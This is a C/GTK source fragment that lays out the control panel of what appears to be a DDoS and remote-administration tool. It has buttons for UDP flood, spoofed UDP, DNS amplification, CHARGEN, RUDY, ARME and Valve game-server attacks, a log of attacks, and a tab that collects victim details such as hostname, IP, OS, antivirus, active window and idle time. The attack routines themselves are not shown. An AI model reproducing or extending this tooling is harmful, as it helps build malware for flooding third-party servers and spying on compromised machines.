    gtk_widget_set_size_request(run_udp_script_1, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_script_1, 115, 50);
    g_signal_connect(G_OBJECT(run_udp_script_1), "clicked", G_CALLBACK(cb_udp_ddos_script_1), run_udp_script_1);

    run_udp_script_2 = gtk_button_new_with_label("UDP BASIC 2 DDOS");
    gtk_widget_set_size_request(run_udp_script_2, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_script_2, 115, 100);
    g_signal_connect(G_OBJECT(run_udp_script_2), "clicked", G_CALLBACK(cb_udp_ddos_script_2), NULL);

    run_udp_lag_script = gtk_button_new_with_label("UDP POWER DDOS");
    gtk_widget_set_size_request(run_udp_lag_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), run_udp_lag_script, 115, 150);
    g_signal_connect(G_OBJECT(run_udp_lag_script), "clicked", G_CALLBACK(cb_udp_power_ddos), NULL);

    valve_source_engine_ddos = gtk_button_new_with_label("VALVE ENGINE DDOS");
    gtk_widget_set_size_request(valve_source_engine_ddos, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), valve_source_engine_ddos, 115, 200);
    g_signal_connect(G_OBJECT(valve_source_engine_ddos), "clicked", G_CALLBACK(cb_valve_engine_ddos), NULL);

    /** Frame 11 : Specific Attacks **/
    GtkWidget *specific_attacks_label = gtk_label_new(NULL);
    gchar *utf8_specific_attacks;

    utf8_specific_attacks = g_locale_to_utf8("<span foreground=\"#ffffff\">Specific Attacks</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(specific_attacks_label), utf8_specific_attacks);
    gtk_fixed_put(GTK_FIXED(zone[2]), specific_attacks_label, 443, 10);

    frame[11] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[11]), "                                    ");
    gtk_frame_set_label_align(GTK_FRAME(frame[11]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[11]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[11], 230, 250);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[11], 430, 10);

    ssyn_send_script = gtk_button_new_with_label("DNS AMP DDOS");
    gtk_widget_set_size_request(ssyn_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), ssyn_send_script, 445, 50);
    //g_signal_connect(G_OBJECT(ssyn_send_script), "clicked", G_CALLBACK(cb_dns_amped_ddos), NULL);

    essyn_send_script = gtk_button_new_with_label("ESSYN DDOS");
    gtk_widget_set_size_request(essyn_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), essyn_send_script, 445, 100);
    g_signal_connect(G_OBJECT(essyn_send_script), "clicked", G_CALLBACK(cb_essyn_attack), NULL);

    chargen_send_script = gtk_button_new_with_label("CHARGEN DDOS");
    gtk_widget_set_size_request(chargen_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), chargen_send_script, 445, 150);
    g_signal_connect(G_OBJECT(chargen_send_script), "clicked", G_CALLBACK(cb_chargen_ddos), NULL);

    udp_spoofed_script = gtk_button_new_with_label("UDP SPOOFED DDOS");
    gtk_widget_set_size_request(udp_spoofed_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), udp_spoofed_script, 445, 200);
    g_signal_connect(G_OBJECT(udp_spoofed_script), "clicked", G_CALLBACK(cb_udp_spoofed), NULL);

    /** Frame 12 : Web Attacks **/
    GtkWidget *web_attacks_label = gtk_label_new(NULL);
    gchar *utf8_web_attacks;

    utf8_web_attacks = g_locale_to_utf8("<span foreground=\"#ffffff\">Web Attacks</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(web_attacks_label), utf8_web_attacks);
    gtk_fixed_put(GTK_FIXED(zone[2]), web_attacks_label, 682, 10);

    frame[12] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[12]), "                             ");
    gtk_frame_set_label_align(GTK_FRAME(frame[12]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[12]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[12], 240, 140);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[12], 670, 10);

    rudy_send_script = gtk_button_new_with_label("RUDY DDOS");
    gtk_widget_set_size_request(rudy_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), rudy_send_script, 690, 50);
    //g_signal_connect(G_OBJECT(rudy_send_script), "clicked", G_CALLBACK(cb_rudy_ddos), argc);

    arme_send_script = gtk_button_new_with_label("ARME DDOS");
    gtk_widget_set_size_request(arme_send_script, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[2]), arme_send_script, 690, 100);
    //g_signal_connect(G_OBJECT(arme_send_script), "clicked", G_CALLBACK(cb_arme_ddos), NULL);

    /** SLOWLORIS ?????? **/

    /** Frame 13 : DDOS Logs **/

    attacks_log_label = gtk_label_new(NULL);
    //gchar *utf8_logs_attacks;

    utf8_logs_attacks = g_locale_to_utf8("<span foreground=\"#ffffff\">Logs</span>\n", -1, NULL, NULL, NULL);
    gtk_label_set_markup(GTK_LABEL(attacks_log_label), utf8_logs_attacks);
    gtk_fixed_put(GTK_FIXED(zone[2]), attacks_log_label, 181, 335);

    frame[13] = gtk_frame_new(NULL);
    gtk_frame_set_label(GTK_FRAME(frame[13]), "           ");
    gtk_frame_set_label_align(GTK_FRAME(frame[13]), (gfloat)0.05, (gfloat)0.5);
    gtk_frame_set_shadow_type(GTK_FRAME(frame[13]), GTK_SHADOW_OUT);
    gtk_widget_set_usize(frame[13], 780, 230);
    gtk_fixed_put(GTK_FIXED(zone[2]), frame[13], 140, 335);

    /** scrolled window on the side of the windows **/
    ddos_scrollbar = gtk_scrolled_window_new(NULL, NULL);
    gtk_widget_set_size_request(ddos_scrollbar, 760, 197);
    gtk_fixed_put(GTK_FIXED(zone[2]), ddos_scrollbar, 150, 358);

    /** Side window (log) **/
    ddos_text_view = gtk_text_view_new();
    gtk_container_add(GTK_CONTAINER(ddos_scrollbar), ddos_text_view);
    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(ddos_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
    //gtk_widget_set_size_request(ddos_text_view, 320, 400);

    /** TAB : Gather infos **/
    GtkWidget *identity_label = gtk_label_new(NULL);
    GtkWidget *country_label = gtk_label_new(NULL);
    GtkWidget *ping_label = gtk_label_new(NULL);
    GtkWidget *cpu_label = gtk_label_new(NULL);
    GtkWidget *ram_label = gtk_label_new(NULL);
    GtkWidget *Idle_label = gtk_label_new(NULL);
    GtkWidget *active_window_label = gtk_label_new(NULL);
    GtkWidget *up_time_label = gtk_label_new(NULL);
    GtkWidget *IP_label = gtk_label_new(NULL);
    GtkWidget *port_label = gtk_label_new(NULL);
    GtkWidget *OS_label = gtk_label_new(NULL);
    GtkWidget *OS_Bits_label = gtk_label_new(NULL);
    GtkWidget *anti_virus_label = gtk_label_new(NULL);

    GtkWidget *gather_info = NULL;

    gchar *utf8_indentity;
    gchar *utf8_country;
    gchar *utf8_ping;
    gchar *utf8_cpu;
    gchar *utf8_ram;
    gchar *utf8_Idle;
    gchar *utf8_active_window;
    gchar *utf8_up_time;
    gchar *utf8_IP;
    gchar *utf8_port;
    gchar *utf8_OS;
    gchar *utf8_OS_bits;
    gchar *utf8_av;

    utf8_indentity = g_locale_to_utf8("<span foreground=\"#ffffff\">Hostname : </span>\n", -1, NULL, NULL, NULL);
    utf8_country = g_locale_to_utf8("<span foreground=\"#ffffff\">Acrhitecture : </span>\n", -1, NULL, NULL, NULL);
    utf8_ping = g_locale_to_utf8("<span foreground=\"#ffffff\">Ping : </span>\n", -1, NULL, NULL, NULL);
    utf8_cpu = g_locale_to_utf8("<span foreground=\"#ffffff\">CPU : </span>\n", -1, NULL, NULL, NULL);
    utf8_ram = g_locale_to_utf8("<span foreground=\"#ffffff\">RAM : </span>\n", -1, NULL, NULL, NULL);
    utf8_Idle = g_locale_to_utf8("<span foreground=\"#ffffff\">Idle : </span>\n", -1, NULL, NULL, NULL);
    utf8_active_window = g_locale_to_utf8("<span foreground=\"#ffffff\">Active Window : </span>\n", -1, NULL, NULL, NULL);

    utf8_up_time = g_locale_to_utf8("<span foreground=\"#ffffff\">Up_Time : </span>\n", -1, NULL, NULL, NULL);
    utf8_IP = g_locale_to_utf8("<span foreground=\"#ffffff\">IP Adresse : </span>\n", -1, NULL, NULL, NULL);
    utf8_port = g_locale_to_utf8("<span foreground=\"#ffffff\">Port : </span>\n", -1, NULL, NULL, NULL);
    utf8_OS = g_locale_to_utf8("<span foreground=\"#ffffff\">OS : </span>\n", -1, NULL, NULL, NULL);
    utf8_OS_bits = g_locale_to_utf8("<span foreground=\"#ffffff\">OS_bits : </span>\n", -1, NULL, NULL, NULL);
    utf8_av = g_locale_to_utf8("<span foreground=\"#ffffff\">Anti Virus : </span>\n", -1, NULL, NULL, NULL);

    gtk_label_set_markup(GTK_LABEL(identity_label), utf8_indentity);
    gtk_label_set_markup(GTK_LABEL(country_label), utf8_country);
    gtk_label_set_markup(GTK_LABEL(ping_label), utf8_ping);
    gtk_label_set_markup(GTK_LABEL(cpu_label), utf8_cpu);
    gtk_label_set_markup(GTK_LABEL(ram_label), utf8_ram);
    gtk_label_set_markup(GTK_LABEL(Idle_label), utf8_Idle);
    gtk_label_set_markup(GTK_LABEL(active_window_label), utf8_active_window);

    gtk_label_set_markup(GTK_LABEL(up_time_label), utf8_up_time);
    gtk_label_set_markup(GTK_LABEL(IP_label), utf8_IP);
    gtk_label_set_markup(GTK_LABEL(port_label), utf8_port);
    gtk_label_set_markup(GTK_LABEL(OS_label), utf8_OS);
    gtk_label_set_markup(GTK_LABEL(OS_Bits_label), utf8_OS_bits);
    gtk_label_set_markup(GTK_LABEL(anti_virus_label), utf8_av);

    gtk_fixed_put(GTK_FIXED(zone[3]), identity_label, 50, 50);
    gtk_fixed_put(GTK_FIXED(zone[3]), country_label, 50, 100);
    gtk_fixed_put(GTK_FIXED(zone[3]), ping_label, 50, 150);
    gtk_fixed_put(GTK_FIXED(zone[3]), cpu_label, 50, 200);
    gtk_fixed_put(GTK_FIXED(zone[3]), ram_label, 50, 250);
    gtk_fixed_put(GTK_FIXED(zone[3]), Idle_label, 50, 300);
    gtk_fixed_put(GTK_FIXED(zone[3]), active_window_label, 50, 350);

    gtk_fixed_put(GTK_FIXED(zone[3]), up_time_label, 350, 50);
    gtk_fixed_put(GTK_FIXED(zone[3]), IP_label, 350, 100);
    gtk_fixed_put(GTK_FIXED(zone[3]), port_label, 350, 150);
    gtk_fixed_put(GTK_FIXED(zone[3]), OS_label, 350, 200);
    gtk_fixed_put(GTK_FIXED(zone[3]), OS_Bits_label, 350, 250);
    gtk_fixed_put(GTK_FIXED(zone[3]), anti_virus_label, 350, 300);

    gather_info = gtk_button_new_with_label("Gather informations");
    gtk_widget_set_size_request(gather_info, 200, 30);
    gtk_fixed_put(GTK_FIXED(zone[3]), gather_info, 600, 50);
    g_signal_connect(G_OBJECT(gather_info), "clicked", G_CALLBACK(cb_gather_infos), NULL);


    hostname_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)hostname_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)hostname_text_view, FALSE);
    gtk_widget_set_size_request(hostname_text_view, 70, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), hostname_text_view, 130, 50);

    architecture_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)architecture_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)architecture_text_view, FALSE);
    gtk_widget_set_size_request(architecture_text_view, 70, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), architecture_text_view, 145, 100);

    os_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)os_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)os_text_view, FALSE);
    gtk_widget_set_size_request(os_text_view, 300, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), os_text_view, 385, 200);

    os_bits_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)os_bits_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)os_bits_text_view, FALSE);
    gtk_widget_set_size_request(os_bits_text_view, 70, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), os_bits_text_view, 415, 250);

    ip_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)ip_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)ip_text_view, FALSE);
    gtk_widget_set_size_request(ip_text_view, 120, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), ip_text_view, 435, 100);

    memory_text_view = gtk_text_view_new();
    gtk_text_view_set_editable((GtkTextView*)memory_text_view, FALSE);
    gtk_text_view_set_cursor_visible((GtkTextView*)memory_text_view, FALSE);
    gtk_widget_set_size_request(memory_text_view, 120, 20);
    gtk_fixed_put(GTK_FIXED(zone[3]), memory_text_view, 95, 250);



    /** TAB Credits **/

  return;
}
